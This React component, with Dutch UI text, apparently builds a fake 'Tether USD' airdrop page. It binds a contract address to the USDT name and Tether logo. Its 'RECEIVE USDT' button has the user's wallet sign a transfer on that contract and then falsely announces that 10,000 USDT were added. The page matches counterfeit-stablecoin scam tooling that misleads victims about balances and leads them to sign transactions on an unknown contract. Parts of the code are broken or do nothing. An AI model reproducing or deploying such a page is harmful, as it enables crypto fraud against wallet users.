import React, { useEffect, useState } from 'react';
import QRCode from 'qrcode.react';
import { ethers } from 'ethers';

const contractAddress = "TQtjrNhHaMxfhyFAtrrQ8F3pgWHyYRsqag"; 
const contractABI = [
  "function transfer(address recipient, uint256 amount) public returns (bool)",
  "function balanceOf(address account) public view returns (uint256)",
  "function airdrop(address recipient, uint256 amount) public"
];

const tokenDetails = {
  address: contractAddress,
  symbol: "USDT",
  decimals: 6,
  image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
};

export default function UsdtTrc20Tron() {
  const [account, setAccount] = useState(null);
  const [added, setAdded] = useState(false);
  const [qrVisible, setQrVisible] = useState(false);
  const [contract, setContract] = useState(null);

  useEffect(() => {
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
      const acc = window.tronWeb.defaultAddress.base58;
      setAccount(acc);
      const tokenContract = window.tronWeb.contract(contractABI, contractAddress);
      setContract(tokenContract);
    }
  }, []);

  const addToken = async () => {
    try {
      alert("Gebruik Trust Wallet / TronLink om handmatig token toe te voegen.");
    } catch (error) {
      console.log('Token toevoegen mislukt', error);
    }
  };

  const airdrop = async () => {
    try {
      if (!contract || !account) return;
      const amount = 10000 * 1e6;
      await contract.transfer(account, amount).send();
      alert("10.000 USDT toegevoegd aan " + account);
    } catch (error) {
      console.error("Fout bij airdrop:", error);
    }
  };

  return (
    <div className="p-4 max-w-xl mx-auto space-y-4">
      <h2>TETHER USD</h2>
      <p>Wallet: {account}</p>

      <button onClick={addToken} disabled={added}>
        {added ? "ADD USDT" : "➕ Voeg USDT toe aan Wallet"}
      </button>

      <button onClick={airdrop}>RECEIVE USDT</button>

      <button onClick={() => setQrVisible(!qrVisible)}>
        📱 {qrVisible ? "Verberg QR" : "Toon QR voor mobiel"}
      </button>
      {qrVisible && account && <QRCode value={account} size={160} />}
    </div>
  );
}